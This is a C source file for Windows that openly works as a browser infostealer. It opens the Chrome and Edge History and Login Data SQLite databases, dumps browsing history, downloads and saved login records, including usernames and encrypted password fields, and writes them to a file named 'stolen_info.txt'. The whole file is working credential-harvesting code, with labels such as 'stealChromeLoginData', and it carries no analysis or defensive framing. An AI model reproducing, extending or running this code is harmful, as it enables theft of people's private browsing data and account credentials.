#include <stdio.h>
#include <sqlite3.h>
#include <time.h>
#include <stdint.h>
#include <sys/unistd.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

FILE* fptr;

int fileOpen() {
    fptr = fopen("stolen_info.txt", "w");
    if (fptr == NULL) {
        printf("File couldn't be opened...\nError Code:%lu\n", GetLastError());
        exit(1);
    }
    return 0;
}

int callback(void* NotUsed, int colNum, char** value, char** colName) {
    const int64_t webkitEpoch = 11644473600000000LL;

    for (int i = 0; i < colNum; i++) {
        if (strncmp(colName[i], "last_visit_time", 15) == 0) {
            int64_t visitTime = atoll(value[i]);
            struct tm* localTime;
            char timeBuffer[100];

            int64_t lastTime = (visitTime - webkitEpoch) / 1000000;

            localTime = localtime((time_t*)&lastTime);
            strftime(timeBuffer, sizeof(timeBuffer), "%Y-%m-%d %H:%M:%S", localTime);

            if (fprintf(fptr, "%s = %s\n", colName[i], timeBuffer) < 0)
                printf("last_visit_time information couldn't be written...\nError Code:%lu\n", GetLastError());
        }
        else {
            if (fprintf(fptr, "%s = %s\n", colName[i], value[i]) < 0)
                printf("%s information couldn't be written...\nError Code:%lu\n", colName[i], GetLastError());
        }
    }
    fprintf(fptr, "\n");
    return 0;
}

int main() {
    char buffer[18384];
    char container[1024];
    char* query;
    sqlite3 *db;
    char* sqliteErrorMsg;
    char* localAppData = getenv("LOCALAPPDATA");
    size_t maxLength = strlen(localAppData) + 100 + 1; // 100 is an arbitrary number, 1 for is null pointer
    char* targetFilePath = malloc(maxLength);
    
    fileOpen();

    snprintf(targetFilePath, maxLength, "%s%s", localAppData, "\\Google\\Chrome\\User Data\\Default\\History");
    if (sqlite3_open(targetFilePath, &db)) {
        printf("Couldn't open the database\n");
        goto stealChromeLoginData;
    }

    query = "SELECT * FROM urls";
    fputs("Chrome - History\n", fptr);
    if (sqlite3_exec(db, query, callback, 0, &sqliteErrorMsg))
        printf("Couldn't execute the SQL command\nError Message:%s\n", sqliteErrorMsg);
    else
        printf("Execution is done succesfully\n\n");

    query = "SELECT urls.*, downloads.* FROM urls INNER JOIN downloads ON urls.url = downloads.tab_url";
    fputs("Chrome - Downloads\n", fptr);
    if (sqlite3_exec(db, query, callback, 0, &sqliteErrorMsg))
        printf("Couldn't execute the SQL command\nError Message:%s\n", sqliteErrorMsg);
    else
        printf("Execution is done succesfully\n\n");

    sqlite3_close(db);

stealChromeLoginData:
    snprintf(targetFilePath, maxLength, "%s%s", localAppData, "\\Google\\Chrome\\User Data\\Default\\Login Data");
    if (sqlite3_open(targetFilePath, &db)) {
        printf("Couldn't open the database\n");
        goto edgeHistory;
    }

    query = "SELECT * FROM logins";
    fputs("Chrome - Login Data\n", fptr);
    if (sqlite3_exec(db, query, callback, 0, &sqliteErrorMsg))
        printf("Couldn't execute the SQL command\nError Message:%s\n", sqliteErrorMsg);
    else
        printf("Execution is done succesfully\n\n");

    sqlite3_close(db);
edgeHistory:
    snprintf(targetFilePath, maxLength, "%s%s", localAppData, "\\Microsoft\\Edge\\User Data\\Default\\History");
    if (sqlite3_open(targetFilePath, &db)) {
        printf("Couldn't open the database\n");
        goto edgeLoginData;
    }

    query = "SELECT * FROM urls";
    fputs("Edge - History\n", fptr);
    if (sqlite3_exec(db, query, callback, 0, &sqliteErrorMsg))
        printf("Couldn't execute the SQL command\nError Message:%s\n", sqliteErrorMsg);
    else
        printf("Execution is done succesfully\n\n");

    query = "SELECT urls.*, downloads.* FROM urls INNER JOIN downloads ON urls.url = downloads.tab_url";
    fputs("Edge - Downloads\n", fptr);
    if (sqlite3_exec(db, query, callback, 0, &sqliteErrorMsg))
        printf("Couldn't execute the SQL command\nError Message:%s\n", sqliteErrorMsg);
    else
        printf("Execution is done succesfully\n\n");
    sqlite3_close(db);

edgeLoginData:
    snprintf(targetFilePath, maxLength, "%s%s", localAppData, "\\Microsoft\\Edge\\User Data\\Default\\Login Data");
    if (sqlite3_open(targetFilePath, &db)) {
        printf("Couldn't open the database\n");
        goto exitProgram;
    }

    query = "SELECT * FROM logins";
    fputs("Edge - Login Data\n", fptr);
    if (sqlite3_exec(db, query, callback, 0, &sqliteErrorMsg))
        printf("Couldn't execute the SQL command\nError Message:%s\n", sqliteErrorMsg);
    else
        printf("Execution is done succesfully\n\n");

    sqlite3_close(db);
exitProgram:
    free(targetFilePath);
    fclose(fptr);
    return 0;
}
